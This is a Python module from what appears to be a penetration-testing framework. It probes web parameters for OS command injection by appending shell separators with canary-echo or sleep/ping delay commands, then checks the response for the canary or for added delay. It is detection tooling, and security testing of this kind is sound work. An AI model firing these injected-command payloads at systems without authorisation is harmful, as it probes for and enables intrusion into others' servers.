"""OS command injection probe (marker + time based).

Injects a bounded set of shell metacharacter separators together with either a
deterministic marker command (``echo <canary>``) or an OS delay command
(``sleep`` / ``ping -c`` / ``ping -n`` / ``timeout``) into every discovered
request parameter. A hit is confirmed two independent ways:

    * marker-based - a unique-per-probe canary token shows up verbatim in the
      response body, meaning the injected command actually ran and its
      output was reflected back.
    * time-based    - the response takes roughly ``delay`` seconds longer
      than a same-parameter control request, meaning the injected sleep/ping
      command executed even though nothing is reflected in the body.

Design constraints (redkit invariants):
    * NO AI/LLM usage - payload generation and hit confirmation are both
      purely rule-based (string templates + a timing threshold).
    * Pure standard library (``urllib``); no third-party dependency at all.
    * Imports and runs on both Windows and Linux; no OS-specific call at
      import time (the payloads target both shell families, but sending an
      HTTP request is itself platform-independent).
    * Bounded: capped separator/payload catalogues, a capped number of
      parameters probed per run, and requests are sent sequentially -
      deliberately never threaded, since concurrent requests would add noise
      to the timing measurements the time-based technique depends on.
    * Safe by default: GET is the default method; a state-changing POST
      request is only ever sent when the operator explicitly sets
      ``method=POST``.
"""
from __future__ import annotations

import uuid
from typing import Dict, List, Optional, Tuple
from urllib.parse import parse_qsl, quote, urlsplit, urlunsplit

from redkit.core.http import WEB_COMMON_OPTIONS, Response, client_from_opts
from redkit.core.module import Module, Option, Result
from redkit.core.registry import register

# --------------------------------------------------------------------------- #
# bounds
# --------------------------------------------------------------------------- #
MAX_PARAMS = 10             # cap on distinct parameters probed in one run
MIN_DELAY = 1
MAX_DELAY = 15              # cap on the operator-supplied delay, seconds
TIMING_MARGIN = 5.0         # head-room added to the timing client's own timeout
TIME_THRESHOLD_RATIO = 0.7  # fraction of `delay` a response must exceed the control by

# --------------------------------------------------------------------------- #
# payload catalogues (deterministic, no AI)
# --------------------------------------------------------------------------- #
# Marker payloads: separator + a canary-echoing command. The injected value is
# built as ``<original value><payload>`` so an app that concatenates the
# parameter straight into a shell command line runs our command as a second
# statement (or inline substitution).
MARKER_PAYLOADS: List[Tuple[str, str]] = [
    (";", "; echo {canary}"),
    ("|", "| echo {canary}"),
    ("||", "|| echo {canary}"),
    ("&&", "&& echo {canary}"),
    ("newline", "\necho {canary}"),   # raw newline separator
    ("%0a", "%0aecho {canary}"),      # literal %0a, left un-encoded on the wire
                                      # so the *target* decodes it to a newline
                                      # (bypasses filters that only block a
                                      # literal LF byte in the raw request)
    ("`", "`echo {canary}`"),         # command substitution (Unix shells)
    ("$()", "$(echo {canary})"),      # command substitution (POSIX sh / pwsh)
]

# Time-based payloads: separator + an OS delay command. Kept to the same
# length as MARKER_PAYLOADS so the worst-case (nothing confirmed) request
# budget per parameter stays small and symmetric.
TIME_PAYLOADS: List[Tuple[str, str]] = [
    (";sleep", "; sleep {delay}"),
    ("|sleep", "| sleep {delay}"),
    ("&&sleep", "&& sleep {delay}"),
    ("`sleep`", "`sleep {delay}`"),
    ("$(sleep)", "$(sleep {delay})"),
    (";ping-c", "; ping -c {delay} 127.0.0.1"),   # Linux/macOS ping
    ("&ping-n", "& ping -n {delay} 127.0.0.1"),   # Windows ping
    ("|timeout", "| timeout /t {delay}"),         # Windows cmd timeout
]


def _quote(value: str) -> str:
    """URL-encode a value, leaving ``%`` untouched.

    Keeping ``%`` alone is what lets the literal ``%0a`` payload arrive on the
    wire exactly as typed instead of being double-encoded into a useless
    ``%250a``. It has no effect on any other payload since none of the other
    templates contain a raw ``%``.
    """
    return quote(str(value), safe="%")


def _encode_pairs(pairs: List[Tuple[str, str]], inject_name: str, inject_value: str) -> str:
    """Re-serialize ``pairs`` as a query/body string, substituting one value.

    If ``inject_name`` is not already present in ``pairs`` it is appended,
    which lets the module probe a parameter the operator names explicitly
    even when it was not present in the original request.
    """
    out: List[str] = []
    done = False
    for name, value in pairs:
        if name == inject_name and not done:
            out.append(f"{_quote(name)}={_quote(inject_value)}")
            done = True
        else:
            out.append(f"{_quote(name)}={_quote(value)}")
    if not done:
        out.append(f"{_quote(inject_name)}={_quote(inject_value)}")
    return "&".join(out)


def _canary() -> str:
    """A short, unique-per-probe token unlikely to appear in normal output."""
    return f"rkcmdi{uuid.uuid4().hex[:10]}"


class _Target:
    """One discovered (or operator-named) parameter to probe."""

    __slots__ = ("location", "name", "value")

    def __init__(self, location: str, name: str, value: str):
        self.location = location  # "query" | "body"
        self.name = name
        self.value = value

    def __repr__(self) -> str:  # pragma: no cover - debug helper
        return f"_Target({self.location}:{self.name}={self.value!r})"


def _discover_targets(url: str, method: str, data_raw: str, param_filter: str) -> Tuple[List[_Target], str]:
    """Work out which parameters to probe.

    Returns ``(targets, warning)``; ``warning`` is a human string to log when
    nothing was found or the parameter cap was hit, else ``""``.
    """
    parts = urlsplit(url)
    query_pairs = parse_qsl(parts.query, keep_blank_values=True)
    body_pairs = parse_qsl(data_raw, keep_blank_values=True) if (method == "POST" and data_raw) else []

    targets: List[_Target] = [_Target("query", n, v) for n, v in query_pairs]
    targets += [_Target("body", n, v) for n, v in body_pairs]

    names_filter = [p.strip() for p in (param_filter or "").split(",") if p.strip()]
    if names_filter:
        known = {t.name for t in targets}
        selected = [t for t in targets if t.name in names_filter]
        default_location = "body" if method == "POST" else "query"
        for name in names_filter:
            if name not in known:
                selected.append(_Target(default_location, name, ""))
        targets = selected

    warning = ""
    if not targets:
        warning = "no request parameters found (no query string, no POST data, no 'param' option)"
    elif len(targets) > MAX_PARAMS:
        warning = f"capping {len(targets)} candidate parameter(s) to {MAX_PARAMS}"
        targets = targets[:MAX_PARAMS]
    return targets, warning


def _build_request(url: str, method: str, data_raw: str, target: _Target, value: str) -> Tuple[str, Optional[str]]:
    """Return ``(request_url, request_body)`` with ``target`` set to ``value``."""
    parts = urlsplit(url)
    if target.location == "query":
        query_pairs = parse_qsl(parts.query, keep_blank_values=True)
        new_query = _encode_pairs(query_pairs, target.name, value)
        req_url = urlunsplit((parts.scheme, parts.netloc, parts.path, new_query, parts.fragment))
        req_body = data_raw if (method == "POST" and data_raw) else None
        return req_url, req_body
    # location == "body"
    body_pairs = parse_qsl(data_raw, keep_blank_values=True) if data_raw else []
    new_body = _encode_pairs(body_pairs, target.name, value)
    return url, new_body


@register
class Cmdi(Module):
    """Marker- and time-based OS command injection probe."""

    name = "web.cmdi"
    description = "OS command injection probe (canary marker + timing delay)"
    phase = "web"
    options = [
        Option("url", help="target URL, including any query string to probe", required=True),
        Option("param", default="", help="comma list of parameter name(s) to test; empty = all discovered params"),
        Option("method", default="GET", choices=["GET", "POST"], help="HTTP method to use"),
        Option("data", default="", help="POST body, form-encoded 'a=1&b=2' (only used when method=POST)"),
        Option("delay", default=5, help="seconds for the time-based sleep/ping probes (capped 1-15)"),
    ] + WEB_COMMON_OPTIONS
    references = [
        "https://owasp.org/www-community/attacks/Command_Injection",
        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection",
    ]

    def run(self, opts: Dict[str, object], ctx) -> Result:
        console = ctx.console
        raw_url = str(opts["url"]).strip()
        method = str(opts["method"]).upper()
        data_raw = str(opts["data"] or "")
        param_filter = str(opts["param"] or "")
        delay = max(MIN_DELAY, min(int(opts["delay"]), MAX_DELAY))

        parts = urlsplit(raw_url if "://" in raw_url else f"http://{raw_url}")
        if not parts.scheme or not parts.hostname:
            return Result(ok=False, summary=f"invalid url: {opts['url']!r}")
        url = urlunsplit(parts)
        host = parts.hostname

        targets, warning = _discover_targets(url, method, data_raw, param_filter)
        if warning:
            console.warn(f"cmdi: {warning}")
        if not targets:
            return Result(
                ok=True,
                summary="no parameters to test",
                data={"url": url, "method": method, "delay": delay, "params_tested": [], "hits": []},
            )

        client = client_from_opts(opts)
        # Time-based probes need to actually observe the injected delay; give
        # that client its own, longer timeout independent of the operator's
        # general per-request timeout so a slow (vulnerable) response is not
        # truncated before we can measure it.
        timing_opts = dict(opts)
        timing_opts["timeout"] = max(float(opts["timeout"]), delay + TIMING_MARGIN)
        timing_client = client_from_opts(timing_opts)

        console.banner("web.cmdi", f"{method} {url}")
        console.info(f"probing {len(targets)} parameter(s), delay={delay}s")

        hits: List[Dict[str, object]] = []
        requests_sent = 0
        params_tested: List[str] = []

        for target in targets:
            params_tested.append(f"{target.location}:{target.name}")

            marker_hit, sent = self._probe_marker(client, url, method, data_raw, target, ctx, host)
            requests_sent += sent
            if marker_hit:
                hits.append(marker_hit)
                continue  # already confirmed critical - skip the timing budget for this param

            time_hit, sent = self._probe_timing(timing_client, url, method, data_raw, target, delay, ctx, host)
            requests_sent += sent
            if time_hit:
                hits.append(time_hit)

        summary = (
            f"{len(hits)} command injection hit(s) across {len(targets)} parameter(s), "
            f"{requests_sent} request(s) sent"
        )
        if hits:
            console.good(summary)
        else:
            console.info(summary)

        data = {
            "url": url,
            "method": method,
            "delay": delay,
            "params_tested": params_tested,
            "hits": hits,
            "requests_sent": requests_sent,
        }
        return Result(ok=True, summary=summary, data=data)

    # ------------------------------------------------------------ marker -- #
    def _probe_marker(
        self, client, url: str, method: str, data_raw: str, target: _Target, ctx, host: Optional[str]
    ) -> Tuple[Optional[Dict[str, object]], int]:
        """Try every marker separator against ``target``; stop at the first hit."""
        sent = 0
        for label, template in MARKER_PAYLOADS:
            canary = _canary()
            payload = template.format(canary=canary)
            value = f"{target.value}{payload}"
            req_url, req_body = _build_request(url, method, data_raw, target, value)
            resp = self._send(client, method, req_url, req_body)
            sent += 1
            if canary in resp.text:
                evidence = (
                    f"{target.location} param '{target.name}': payload {payload!r} -> "
                    f"canary {canary!r} reflected in response body"
                )
                ctx.console.bad(f"cmdi CONFIRMED (marker/{label}) {target.location}:{target.name}")
                ctx.engagement.add_finding(
                    f"OS command injection ({target.location} param '{target.name}')",
                    severity="critical",
                    host=host,
                    description=(
                        f"Marker-based OS command injection confirmed via separator '{label}': the "
                        f"injected command's output (a unique canary) was reflected in the HTTP "
                        f"response body."
                    ),
                    evidence=evidence,
                )
                return {
                    "technique": "marker",
                    "location": target.location,
                    "param": target.name,
                    "separator": label,
                    "payload": payload,
                    "canary": canary,
                    "url": req_url,
                }, sent
        return None, sent

    # ------------------------------------------------------------ timing -- #
    def _probe_timing(
        self, client, url: str, method: str, data_raw: str, target: _Target, delay: int, ctx, host: Optional[str]
    ) -> Tuple[Optional[Dict[str, object]], int]:
        """Measure a control request, then try every delay payload against ``target``."""
        sent = 0
        control_url, control_body = _build_request(url, method, data_raw, target, target.value)
        control_resp = self._send(client, method, control_url, control_body)
        sent += 1
        if control_resp.error is not None:
            return None, sent  # target/control unreachable - timing is meaningless

        baseline = control_resp.elapsed
        threshold = max(delay * TIME_THRESHOLD_RATIO, 2.0)

        for label, template in TIME_PAYLOADS:
            payload = template.format(delay=delay)
            value = f"{target.value}{payload}"
            req_url, req_body = _build_request(url, method, data_raw, target, value)
            resp = self._send(client, method, req_url, req_body)
            sent += 1
            if resp.error is not None:
                # A transport-level failure (e.g. the client's own timeout,
                # which is deliberately set close to `delay`) is not evidence
                # of the injected sleep/ping actually running - elapsed time
                # on an aborted request is meaningless and would otherwise
                # look identical to a real delayed response. Skip it rather
                # than risk a false "confirmed" critical finding.
                continue
            delta = resp.elapsed - baseline
            if delta >= threshold and resp.elapsed >= threshold:
                evidence = (
                    f"{target.location} param '{target.name}': payload {payload!r} took "
                    f"{resp.elapsed:.2f}s vs control {baseline:.2f}s (requested delay {delay}s)"
                )
                ctx.console.bad(f"cmdi CONFIRMED (timing/{label}) {target.location}:{target.name}")
                ctx.engagement.add_finding(
                    f"OS command injection ({target.location} param '{target.name}')",
                    severity="critical",
                    host=host,
                    description=(
                        f"Time-based OS command injection confirmed via separator '{label}': response "
                        f"time increased by {delta:.2f}s (control {baseline:.2f}s) after injecting a "
                        f"{delay}s delay command."
                    ),
                    evidence=evidence,
                )
                return {
                    "technique": "time",
                    "location": target.location,
                    "param": target.name,
                    "separator": label,
                    "payload": payload,
                    "baseline_s": round(baseline, 2),
                    "response_s": round(resp.elapsed, 2),
                    "url": req_url,
                }, sent
        return None, sent

    @staticmethod
    def _send(client, method: str, url: str, body: Optional[str]) -> Response:
        """Issue one GET/POST through ``client``, tolerating transport errors."""
        if method == "POST":
            headers = {"Content-Type": "application/x-www-form-urlencoded"} if body else None
            return client.post(url, data=body, headers=headers)
        return client.get(url)
